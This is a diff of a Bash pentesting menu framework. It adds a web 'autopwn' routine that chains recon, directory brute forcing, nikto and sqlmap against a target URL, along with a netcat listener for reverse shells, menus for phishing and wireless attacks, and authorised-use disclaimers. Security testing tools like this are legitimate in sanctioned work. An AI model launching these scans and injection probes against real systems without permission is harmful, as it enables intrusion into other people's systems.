+Scan ID: $timestamp
+
+=== OPEN PORTS ===
+$(grep -E "^[0-9]+/open" "$report_dir/nmap_full.nmap" 2>/dev/null || echo "See nmap_full.nmap")
+
+=== SERVICES ===
+$(grep -E "^[0-9]+/(tcp|udp)" "$report_dir/nmap_full.nmap" 2>/dev/null || echo "See nmap_full.nmap")
+
+=== FILES GENERATED ===
+$(ls -la "$report_dir/")
+
+=== NEXT STEPS ===
+1. Review nmap_full.nmap for service versions
+2. Check smb_enum for share access
+3. Review vuln_scan.txt for vulnerabilities
+4. Check exploits.txt for potential exploits
+5. If web services found, check directories.txt for hidden paths
+EOF
+
+    echo ""
+    echo "[6/6] Complete!"
+    echo -e "${GREEN}[+] Autopwn complete! Report saved to: $report_dir/AUTOPWN_REPORT.txt${NC}"
+    cat "$report_dir/AUTOPWN_REPORT.txt"
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+autopwn_url() {
+    echo -e "${BLUE}[*] Autopwn URL/Domain${NC}"
+    echo -n "Enter target URL (e.g., http://target.com): "
+    read target_url
+    
+    [[ -z "$target_url" ]] && return
+    
+    # Ensure URL has protocol
+    [[ ! "$target_url" =~ ^http ]] && target_url="http://$target_url"
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local domain=$(echo "$target_url" | sed -E 's|https?://||' | cut -d'/' -f1)
+    local report_dir="$RESULTS_DIR/autopwn/url_${domain}_$timestamp"
+    create_dir "$report_dir"
+    
+    echo -e "${YELLOW}[*] Starting automated web exploitation against $target_url${NC}"
+    echo -e "${RED}[!] WARNING: Only use against systems you own or have permission to test!${NC}"
+    echo -n "Continue? (y/n): "
+    read confirm
+    [[ "$confirm" != "y" ]] && return
+    
+    # Step 1: Initial recon
+    echo ""
+    echo "[1/7] Running initial reconnaissance..."
+    curl -s -I "$target_url" > "$report_dir/headers.txt" 2>&1 || true
+    whatweb "$target_url" > "$report_dir/whatweb.txt" 2>&1 || true
+    
+    # Step 2: DNS/Domain info
+    echo ""
+    echo "[2/7] Gathering DNS information..."
+    host "$domain" > "$report_dir/dns.txt" 2>&1 || true
+    host -t mx "$domain" >> "$report_dir/dns.txt" 2>&1 || true
+    whois "$domain" > "$report_dir/whois.txt" 2>&1 || true
+    
+    # Step 3: Subdomain enumeration
+    echo ""
+    echo "[3/7] Enumerating subdomains..."
+    for sub in www mail ftp admin portal api dev test staging shop blog; do
+        host "$sub.$domain" >> "$report_dir/subdomains.txt" 2>&1 &
+    done
+    wait
+    
+    # Step 4: Directory brute force
+    echo ""
+    echo "[4/7] Brute forcing directories..."
+    if [[ -f "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" ]]; then
+        gobuster dir -u "$target_url" -w "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
+            -o "$report_dir/directories.txt" -t 50 -x php,txt,html,bak 2>/dev/null || \
+        dirb "$target_url" "$WORDLISTS_DIR/seclists/Discovery/Web-Content/common.txt" \
+            -o "$report_dir/directories.txt" 2>/dev/null || true
+    fi
+    
+    # Step 5: Vulnerability scan
+    echo ""
+    echo "[5/7] Running vulnerability scan..."
+    nikto -h "$target_url" -output "$report_dir/nikto.txt" 2>/dev/null || true
+    
+    # Check for SQL injection
+    echo "  [*] Testing for SQL injection..."
+    sqlmap -u "$target_url" --batch --forms --crawl=2 --level=1 --risk=1 \
+        -o "$report_dir/sqlmap.txt" 2>/dev/null || true
+    
+    # Step 6: SSL/TLS scan if HTTPS
+    if [[ "$target_url" =~ ^https ]]; then
+        echo ""
+        echo "[6/7] Scanning SSL/TLS..."
+        nmap --script ssl-enum-ciphers -p 443 "$domain" -oN "$report_dir/ssl_scan.txt" 2>/dev/null || true
+        sslyze "$target_url" > "$report_dir/sslyze.txt" 2>/dev/null || true
+    fi
+    
+    # Step 7: Generate report
+    echo ""
+    echo "[7/7] Generating report..."
+    cat > "$report_dir/WEB_AUTOPWN_REPORT.txt" << EOF
+WEB AUTOPWN REPORT
+==================
+Target: $target_url
+Domain: $domain
+Date: $(date)
+Scan ID: $timestamp
+
+=== HTTP HEADERS ===
+$(cat "$report_dir/headers.txt" 2>/dev/null || echo "Not available")
+
+=== DNS INFO ===
+$(cat "$report_dir/dns.txt" 2>/dev/null || echo "Not available")
+
+=== SUBDOMAINS ===
+$(grep "has address" "$report_dir/subdomains.txt" 2>/dev/null || echo "None found")
+
+=== DIRECTORIES FOUND ===
+$(cat "$report_dir/directories.txt" 2>/dev/null | head -30 || echo "See directories.txt")
+
+=== VULNERABILITIES (Nikto) ===
+$(grep -E "OSVDB|CVE" "$report_dir/nikto.txt" 2>/dev/null | head -20 || echo "See nikto.txt")
+
+=== FILES GENERATED ===
+$(ls -la "$report_dir/")
+
+=== NEXT STEPS ===
+1. Review directories.txt for interesting paths
+2. Check nikto.txt for vulnerabilities
+3. Review sqlmap.txt for SQL injection findings
+4. If SSL scan present, check for weak ciphers
+5. Test discovered endpoints manually
+EOF
+
+    echo -e "${GREEN}[+] Web autopwn complete! Report saved to: $report_dir/WEB_AUTOPWN_REPORT.txt${NC}"
+    cat "$report_dir/WEB_AUTOPWN_REPORT.txt"
+    
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# =============================================================================
+# INFO MODULE
+# =============================================================================
+
+info_menu() {
+    while true; do
+        echo -e "${CYAN}"
+        cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════╗
+    ║              INFORMATION & HELP                           ║
+    ╚═══════════════════════════════════════════════════════════╝
+EOF
+        echo -e "${NC}"
+        
+        echo "1) Framework Information"
+        echo "2) Tool Descriptions"
+        echo "3) Usage Guidelines"
+        echo "4) Legal Disclaimer"
+        echo "5) System Information"
+        echo "6) View Logs"
+        echo "0) Back to Main Menu"
+        echo ""
+        echo -n "Select option: "
+        read info_choice
+        
+        case $info_choice in
+            1) framework_info ;;
+            2) tool_descriptions ;;
+            3) usage_guidelines ;;
+            4) legal_disclaimer ;;
+            5) system_info ;;
+            6) view_logs ;;
+            0) break ;;
+            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
+        esac
+    done
+}
+
+framework_info() {
+    echo -e "${BLUE}[*] Framework Information${NC}"
+    echo ""
+    echo "SuperHack Framework v$VERSION"
+    echo "======================="
+    echo ""
+    echo "Configuration Directory: $CONFIG_DIR"
+    echo "Log Directory: $LOG_DIR"
+    echo "Wordlists Directory: $WORDLISTS_DIR"
+    echo "Results Directory: $RESULTS_DIR"
+    echo ""
+    echo "Installed Tools:"
+    for tool in nmap metasploit-framework hydra gobuster aircrack-ng john hashcat sqlmap nikto; do
+        if command -v "$tool" &>/dev/null; then
+            local version=$($tool --version 2>/dev/null | head -1 || echo "installed")
+            echo "  [+] $tool: $version"
+        else
+            echo "  [-] $tool: not installed"
+        fi
+    done
+    
+    echo ""
+    echo -n "Press Enter to continue..."
+    read
+}
+
+tool_descriptions() {
+    echo -e "${BLUE}[*] Tool Descriptions${NC}"
+    echo ""
+    echo "=== Network Scanning ==="
+    echo "Nmap         - Port scanner and network discovery"
+    echo "Masscan      - High-speed port scanner"
+    echo ""
+    echo "=== Enumeration ==="
+    echo "Enum4linux   - SMB enumeration for Windows"
+    echo "Gobuster     - Directory/file brute forcer"
+    echo "Nikto        - Web vulnerability scanner"
+    echo ""
+    echo "=== Exploitation ==="
+    echo "Metasploit   - Exploitation framework"
+    echo "SQLMap       - SQL injection automation"
+    echo "Hydra        - Login brute forcer"
+    echo ""
+    echo "=== Wireless ==="
+    echo "Aircrack-ng  - WiFi security auditing"
+    echo "Reaver       - WPS PIN attack tool"
+    echo ""
+    echo "=== Password Cracking ==="
+    echo "John         - Password hash cracker"
+    echo "Hashcat      - GPU-accelerated hash cracker"
+    echo ""
+    echo "=== OSINT ==="
+    echo "theHarvester - Email harvesting"
+    echo "Shodan       - Internet device search"
+    echo ""
+    echo "=== Blue Team ==="
+    echo "ClamAV       - Antivirus scanner"
+    echo "rkhunter     - Rootkit detector"
+    
+    echo ""
+    echo -n "Press Enter to continue..."
+    read
+}
+
+usage_guidelines() {
+    echo -e "${BLUE}[*] Usage Guidelines${NC}"
+    echo ""
+    echo "1. ALWAYS obtain written permission before testing"
+    echo "2. Document all activities and findings"
+    echo "3. Respect scope boundaries"
+    echo "4. Do not exfiltrate sensitive data"
+    echo "5. Report vulnerabilities responsibly"
+    echo "6. Maintain confidentiality of findings"
+    echo ""
+    echo "Workflow:"
+    echo "1. Reconnaissance (OSINT, scanning)"
+    echo "2. Enumeration (services, shares, users)"
+    echo "3. Vulnerability Assessment"
+    echo "4. Exploitation (with authorization)"
+    echo "5. Post-Exploitation"
+    echo "6. Reporting"
+    
+    echo ""
+    echo -n "Press Enter to continue..."
+    read
+}
+
+legal_disclaimer() {
+    echo -e "${RED}"
+    cat << "EOF"
+    ╔═══════════════════════════════════════════════════════════╗
+    ║                    LEGAL DISCLAIMER                       ║
+    ╚═══════════════════════════════════════════════════════════╝
+EOF
+    echo -e "${NC}"
+    echo ""
+    echo "This framework is for AUTHORIZED security testing only."
+    echo ""
+    echo "Unauthorized access to computer systems is illegal under:"
+    echo "  - Computer Fraud and Abuse Act (US)"
+    echo "  - Computer Misuse Act (UK)"
+    echo "  - Similar laws in your jurisdiction"
+    echo ""
+    echo "Users are responsible for:"
+    echo "  - Obtaining proper authorization"
+    echo "  - Complying with applicable laws"
+    echo "  - Using tools ethically and responsibly"
+    echo ""
+    echo "The authors assume NO liability for misuse or damage."
+    
+    echo ""
+    echo -n "Press Enter to continue..."
+    read
+}
+
+# =============================================================================
 # POST-EXPLOITATION & UTILITIES
 # =============================================================================
 
@@ -2090,19 +3468,30 @@ network_listener() {
     
     echo -n "Enter port to listen on: "
     read listen_port
+    [[ -z "$listen_port" ]] && return
+    
     echo -n "Save output to file? (y/n): "
     read save_output
     
-    echo -e "${YELLOW}[*] Starting listener on port $listen_port...${NC}"
-    echo -e "${CYAN}Waiting for connection...${NC}"
+    timestamp=$(date +%Y%m%d_%H%M%S)
     
-    if [[ "$save_output" == "y" ]]; then
-        timestamp=$(date +%Y%m%d_%H%M%S)
-        local output_file="$RESULTS_DIR/netcat_listener_$timestamp.txt"
-        nc -lvp "$listen_port" | tee "$output_file"
-        echo -e "${GREEN}[+] Output saved to: $output_file${NC}"
-    else
-        nc -lvp "$listen_port"
+    echo -e "${YELLOW}[*] Starting listener on port $listen_port...${NC}"
+    echo -e "${RED}[!] Run this in another terminal if you need to continue using this menu:${NC}"
+    echo -e "${CYAN}nc -lvp $listen_port${NC}"
+    echo ""
+    echo -n "Start listener now? (y/n): "
+    read start_now
+    
+    if [[ "$start_now" == "y" ]]; then
+        if [[ "$save_output" == "y" ]]; then
+            local output_file="$RESULTS_DIR/netcat_listener_$timestamp.txt"
+            echo -e "${YELLOW}[*] Listening... (Ctrl+C to stop)${NC}"
+            nc -lvp "$listen_port" | tee "$output_file"
+            echo -e "${GREEN}[+] Output saved to: $output_file${NC}"
+        else
+            echo -e "${YELLOW}[*] Listening... (Ctrl+C to stop)${NC}"
+            nc -lvp "$listen_port"
+        fi
     fi
     
     echo -n "Press Enter to continue..."
@@ -2115,6 +3504,8 @@ quick_reverse_shell() {
     
     echo -n "Enter your IP (LHOST): "
     read lhost
+    [[ -z "$lhost" ]] && return
+    
     echo -n "Enter port (LPORT): "
     read lport
     
@@ -2136,9 +3527,14 @@ quick_reverse_shell() {
     echo ""
     
     echo -n "Start listener now? (y/n): "
-    start_listener
+    read start_listener
     if [[ "$start_listener" == "y" ]]; then
         echo -e "${YELLOW}[*] Starting listener...${NC}"
+        echo -e "${RED}[!] This will block the terminal. Run in another terminal to continue:${NC}"
+        echo -e "${CYAN}nc -lvp $lport${NC}"
+        echo ""
+        echo -n "Press Enter to start listener (Ctrl+C to stop)..."
+        read
         nc -lvp "$lport"
     fi
     
@@ -2226,16 +3622,16 @@ update_framework() {
 main_menu() {
     while true; do
         show_banner
-        
-        echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
-        echo -e "${CYAN}║                    MAIN MENU                              ║${NC}"
-        echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
         echo ""
-        echo -e "${GREEN}  [1]${NC} Network Scanning        ${GREEN}[6]${NC}  Password Cracking"
-        echo -e "${GREEN}  [2]${NC} Enumeration             ${GREEN}[7]${NC}  Phishing Tools"
-        echo -e "${GREEN}  [3]${NC} Brute Force             ${GREEN}[8]${NC}  Wireless Attacks"
-        echo -e "${GREEN}  [4]${NC} Payload Generation      ${GREEN}[9]${NC}  Utilities"
-        echo -e "${GREEN}  [5]${NC} Exploit Database        ${GREEN}[10]${NC} System"
+        echo -e "${GREEN}  [1]${NC} Network Scanning        ${GREEN}[7]${NC}  Phishing Tools"
+        echo -e "${GREEN}  [2]${NC} Enumeration             ${GREEN}[8]${NC}  Wireless Attacks"
+        echo -e "${GREEN}  [3]${NC} Brute Force             ${GREEN}[9]${NC}  Utilities"
+        echo -e "${GREEN}  [4]${NC} Payload Generation      ${GREEN}[10]${NC} System"
+        echo -e "${GREEN}  [5]${NC} Exploit Database        ${GREEN}[11]${NC} OSINT"
+        echo -e "${GREEN}  [6]${NC} Password Cracking       ${GREEN}[12]${NC} Blue Team"
+        echo ""
+        echo -e "${MAGENTA}  [A]${NC} Autopwn (Auto Exploit)"
+        echo -e "${MAGENTA}  [I]${NC} Information/Help"
         echo ""
         echo -e "${YELLOW}  [0] Exit Framework${NC}"
         echo ""
@@ -2244,34 +3640,42 @@ main_menu() {
         
         case $menu_choice in
             1)
-                echo ""
-                echo -e "${CYAN}=== NETWORK SCANNING ===${NC}"
-                echo "1) Advanced Nmap Scanner"
-                echo "2) Network Discovery (Ping Sweep)"
-                echo "3) Quick Port Scanner"
-                echo -n "Choice: "
-                read scan_choice
-                case $scan_choice in
-                    1) advanced_nmap_scan ;;
-                    2) network_discovery ;;
-                    3) port_scanner ;;
-                esac
+                while true; do
+                    echo ""
+                    echo -e "${CYAN}=== NETWORK SCANNING ===${NC}"
+                    echo "1) Advanced Nmap Scanner"
+                    echo "2) Network Discovery (Ping Sweep)"
+                    echo "3) Quick Port Scanner"
+                    echo "0) Back to Main Menu"
+                    echo -n "Choice: "
+                    read scan_choice
+                    case $scan_choice in
+                        1) advanced_nmap_scan ;;
+                        2) network_discovery ;;
+                        3) port_scanner ;;
+                        0) break ;;
+                    esac
+                done
                 ;;
             2)
-                echo ""
-                echo -e "${CYAN}=== ENUMERATION ===${NC}"
-                echo "1) SMB Enumeration"
-                echo "2) LDAP/AD Enumeration"
-                echo "3) Web Enumeration"
-                echo "4) Subdomain Enumeration"
-                echo -n "Choice: "
-                read enum_choice
-                case $enum_choice in
-                    1) smb_enum ;;
-                    2) ldap_enum ;;
-                    3) web_enum ;;
-                    4) subdomain_enum ;;
-                esac
+                while true; do
+                    echo ""
+                    echo -e "${CYAN}=== ENUMERATION ===${NC}"
+                    echo "1) SMB Enumeration"
+                    echo "2) LDAP/AD Enumeration"
+                    echo "3) Web Enumeration"
+                    echo "4) Subdomain Enumeration"
+                    echo "0) Back to Main Menu"
+                    echo -n "Choice: "
+                    read enum_choice
+                    case $enum_choice in
+                        1) smb_enum ;;
+                        2) ldap_enum ;;
+                        3) web_enum ;;
+                        4) subdomain_enum ;;
+                        0) break ;;
+                    esac
+                done
                 ;;
             3) brute_force ;;
             4) payload_gen ;;
@@ -2280,33 +3684,47 @@ main_menu() {
             7) phishing_menu ;;
             8) wifi_attacks ;;
             9)
-                echo ""
-                echo -e "${CYAN}=== UTILITIES ===${NC}"
-                echo "1) Network Listener"
-                echo "2) Quick Reverse Shell"
-                echo "3) View Logs"
-                echo -n "Choice: "
-                read util_choice
-                case $util_choice in
-                    1) network_listener ;;
-                    2) quick_reverse_shell ;;
-                    3) view_logs ;;
-                esac
+                while true; do
+                    echo ""
+                    echo -e "${CYAN}=== UTILITIES ===${NC}"
+                    echo "1) Network Listener"
+                    echo "2) Quick Reverse Shell"
+                    echo "3) View Logs"
+                    echo "0) Back to Main Menu"
+                    echo -n "Choice: "
+                    read util_choice
+                    case $util_choice in
+                        1) network_listener ;;
+                        2) quick_reverse_shell ;;
+                        3) view_logs ;;
+                        0) break ;;
+                    esac
+                done
                 ;;
             10)
-                echo ""
-                echo -e "${CYAN}=== SYSTEM ===${NC}"
-                echo "1) System Information"
-                echo "2) Update Framework"
-                echo "3) Initialize Directories"
-                echo -n "Choice: "
-                read sys_choice
-                case $sys_choice in
-                    1) system_info ;;
-                    2) update_framework ;;
-                    3) init_dirs ;;
-                esac
+                while true; do
+                    echo ""
+                    echo -e "${CYAN}=== SYSTEM ===${NC}"
+                    echo "1) System Information"
+                    echo "2) Update Framework"
+                    echo "3) Initialize Directories"
+                    echo "4) Package Manager"
+                    echo "0) Back to Main Menu"
+                    echo -n "Choice: "
+                    read sys_choice
+                    case $sys_choice in
+                        1) system_info ;;
+                        2) update_framework ;;
+                        3) init_dirs ;;
+                        4) smart_package_manager ;;
+                        0) break ;;
+                    esac
+                done
                 ;;
+            11) osint_menu ;;
+            12) blueteam_menu ;;
+            [Aa]) autopwn_menu ;;
+            [Ii]) info_menu ;;
             0)
                 echo -e "${GREEN}[+] Exiting SuperHack Framework${NC}"
                 echo -e "${YELLOW}[*] Goodbye!${NC}"
